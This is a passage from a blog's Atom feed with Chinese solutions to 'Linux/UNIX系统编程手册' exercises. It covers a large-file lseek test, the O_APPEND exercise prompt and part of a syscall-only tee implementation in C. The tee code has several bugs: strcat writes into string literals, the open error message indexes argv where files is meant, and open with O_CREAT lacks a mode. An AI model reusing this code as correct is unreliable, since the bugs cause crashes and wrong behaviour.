class=&quot;type&quot;&gt;off64_t&lt;/span&gt; off = &lt;span class=&quot;built_in&quot;&gt;atoll&lt;/span&gt;(argv[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;lseek64&lt;/span&gt;(fd, off, SEEK_SET) == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;lseek64&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;write&lt;/span&gt;(fd, &lt;span class=&quot;string&quot;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;write&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;ifdef&lt;/span&gt; _FILE_OFFSET_BITS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;ifdef&lt;/span&gt; debug&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;sizeof(long) = %d, sizeof(long long) = %d, sizeof(off_t) = %d\n&amp;quot;&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;long&lt;/span&gt;), &lt;span class=&quot;built_in&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;long&lt;/span&gt;), &lt;span class=&quot;built_in&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;off_t&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(argc !=&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; || &lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;], &lt;span class=&quot;string&quot;&gt;&amp;quot;--help&amp;quot;&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot; pathname offset\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; fd = &lt;span class=&quot;built_in&quot;&gt;open&lt;/span&gt;(argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;], O_RDWR | O_CREAT, S_IRUSR|S_IWUSR);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(fd == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;open64 fail&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;off_t&lt;/span&gt; off = &lt;span class=&quot;built_in&quot;&gt;atoll&lt;/span&gt;(argv[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;lseek&lt;/span&gt;(fd, off, SEEK_SET) == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;lseek64&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;write&lt;/span&gt;(fd, &lt;span class=&quot;string&quot;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;write&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;writeErr&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt;* str)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    errno = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; writeSize = &lt;span class=&quot;built_in&quot;&gt;write&lt;/span&gt;(STDERR_FILENO, str, &lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(str));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(writeSize == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;练习2&quot;&gt;&lt;a href=&quot;#练习2&quot; class=&quot;headerlink&quot; title=&quot;练习2&quot;&gt;&lt;/a&gt;练习2&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;5-2.编写一个程序，使用O_APPEND标志并以写方式打开一个已存在的文件，且将文件偏移量置于文件起始处，再写入数据。数据会显示在文件中的哪个位置?为什么?&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/categories/linux/"/>
    
    
    <category term="Linux/UNIX系统编程手册" scheme="https://jingtianer.github.io/home/tags/Linux-UNIX%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>cha4.文件IO:通用的I/O模型</title>
    <link href="https://jingtianer.github.io/home/2023/03/22/linux/Linux-UNIX%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%E6%89%8B%E5%86%8C/cha4/"/>
    <id>https://jingtianer.github.io/home/2023/03/22/linux/Linux-UNIX%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%E6%89%8B%E5%86%8C/cha4/</id>
    <published>2023-03-22T10:05:00.000Z</published>
    <updated>2023-03-22T02:40:51.697Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实现tee"><a href="#实现tee" class="headerlink" title="实现tee"></a>实现tee</h2><blockquote><p>tee命令是从标准输入中读取数据，直至文件结尾，随后将数据写入标准输出和命令行参数所指定的文件。(44.7节讨论FIFO时，会展示使用tee命令的一个例子。)请使用IO系统调用实现tee命令。默认情况下，若已存在与命令行参数指定文件同名的文件，tee命令会将其覆盖。如文件已存在，请实现-a命令行选项<code>tee-a file</code>在文件结尾处追加数据。(请参考附录B中对getopt)函数的描述来解析命令行选项。</p></blockquote><h3 id="预处理与函数声明"><a href="#预处理与函数声明" class="headerlink" title="预处理与函数声明"></a>预处理与函数声明</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span> <span class="comment">// 使用变量errno</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> strcmp(a,b) strcmp(a,b)==0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// exit code</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNSUPPORTED_ARG 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_OPEN_FAIL 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDOUT_WRITE_FAIL 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDERR_WRITE_FAIL 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDIN_READ_FAIL 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PARTIAL_WRITE_OCCURED 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_CLOSE_FAIL 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_WRITE_FAIL 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHelp</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printVersion</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">writeStdout</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">exitErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * err, <span class="type">int</span> exitcode)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">release</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FILE_COUNT 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_BUFFER_SIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局资源</span></span><br><span class="line"><span class="type">char</span> **files = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> *fds = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> fileCount = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><blockquote><p>不引用c的库函数，直接使用系统调用对文件进行读写，不引入<code>stdio.h</code></p></blockquote><h3 id="工具函数"><a href="#工具函数" class="headerlink" title="工具函数"></a>工具函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">release</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 关闭文件</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileCount; i++) &#123;</span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> success = close(fds[i]);</span><br><span class="line">        <span class="keyword">if</span>(success == <span class="number">-1</span>) &#123;</span><br><span class="line">            exitErr(<span class="built_in">strcat</span>(<span class="string">&quot;can not close file: &quot;</span>, files[i]), FILE_CLOSE_FAIL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(files);</span><br><span class="line">    <span class="built_in">free</span>(fds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHelp</span><span class="params">()</span> &#123;</span><br><span class="line">    writeStdout(<span class="string">&quot;Usage: tee [-ai][--help][--version][files...]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printVersion</span><span class="params">()</span> &#123;</span><br><span class="line">    writeStdout(<span class="string">&quot;Written by Jingtian Meow\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exitErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * err, <span class="type">int</span> exitcode)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *errstr = strerror(errno);</span><br><span class="line">    writeErr(<span class="string">&quot;Error: &quot;</span>);</span><br><span class="line">    writeErr(errstr);</span><br><span class="line">    writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    writeErr(err);</span><br><span class="line">    writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    release();</span><br><span class="line">    <span class="built_in">exit</span>(exitcode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeStdout</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(STDOUT_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        exitErr(<span class="string">&quot;fail to write to stdout\n&quot;</span>, STDOUT_WRITE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeErr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> writeSize = write(STDERR_FILENO, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    <span class="keyword">if</span>(writeSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        release();</span><br><span class="line">        <span class="built_in">exit</span>(STDERR_WRITE_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>实现错误打印，正常输出<ul><li>对于错误，利用系统调用write，写入文件fd<code>STDERR_FILENO</code>指代的标准错误流中</li><li>使用errno宏和strerror获取出错后的错误字符串，并打印其他提示信息</li></ul></li><li>实现资源释放</li></ul><h3 id="资源分配"><a href="#资源分配" class="headerlink" title="资源分配"></a>资源分配</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存文件名，打开文件的fd，文件总数</span></span><br><span class="line">files = (<span class="type">char</span> **)<span class="built_in">malloc</span>(MAX_FILE_COUNT*<span class="keyword">sizeof</span>(<span class="type">char</span> *));</span><br><span class="line">fds = (<span class="type">int</span> *)<span class="built_in">malloc</span>(MAX_FILE_COUNT*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">fileCount = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="参数处理"><a href="#参数处理" class="headerlink" title="参数处理"></a>参数处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="comment">// 参数处理结果</span></span><br><span class="line">    <span class="type">bool</span> append = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">bool</span> ignore_int = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理参数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argv[i][<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-a&quot;</span>)) &#123;</span><br><span class="line">                append = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-i&quot;</span>) || <span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--ignore-interrupts&quot;</span>)) &#123;</span><br><span class="line">                ignore_int = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-ai&quot;</span>) || <span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-ia&quot;</span>) ) &#123;</span><br><span class="line">                append = <span class="literal">true</span>;</span><br><span class="line">                ignore_int = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--help&quot;</span>)) &#123;</span><br><span class="line">                printHelp();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--version&quot;</span>)) &#123;</span><br><span class="line">                printVersion();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                writeErr(<span class="string">&quot;Unsupported arg: &quot;</span>);</span><br><span class="line">                writeErr(argv[i]);</span><br><span class="line">                writeErr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">free</span>(files);</span><br><span class="line">                <span class="built_in">free</span>(fds);</span><br><span class="line">                <span class="built_in">exit</span>(UNSUPPORTED_ARG);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(fileCount &lt; MAX_FILE_COUNT<span class="number">-1</span>) files[fileCount++] = argv[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// other part of code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>支持参数<code>-a, --help, --version</code>，处理结果保存至<code>append</code>和<code>ignore_int</code></p><p>对于不是以<code>-</code>开头的参数，认为其是文件名，存储到<code>files</code></p><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打开文件，保存fd</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileCount; i++) &#123;</span><br><span class="line">    fds[i] = open(files[i], O_CREAT | O_WRONLY | (append == <span class="literal">true</span> ? O_APPEND : O_TRUNC));</span><br><span class="line">    <span class="keyword">if</span>(fds[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">        exitErr(<span class="built_in">strcat</span>(<span class="string">&quot;Can not open file: &quot;</span>, argv[i]), FILE_OPEN_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>将<code>files</code>中的文件打开，存储其<code>fd</code></li></ul><h3 id="读取stdin，写入文件"><a href="#读取stdin，写入文件" class="headerlink" title="读取stdin，写入文件"></a>读取stdin，写入文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取stdin</span></span><br><span class="line"><span class="type">ssize_t</span> readSize = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> readBuffer[READ_BUFFER_SIZE+<span class="number">1</span>]; <span class="comment">// 需要手动添加&#x27;\0&#x27;， 故+1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    readSize = read(STDIN_FILENO, readBuffer, READ_BUFFER_SIZE);</span><br><span class="line">    <span class="keyword">if</span>(readSize == <span class="number">-1</span>) &#123;</span><br><span class="line">        exitErr(<span class="string">&quot;read stdin fail&quot;</span>, STDIN_READ_FAIL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(readSize == <span class="number">0</span>) &#123; <span class="comment">//EOF</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    readBuffer[readSize] = <span class="string">&#x27;\0&#x27;</span>; 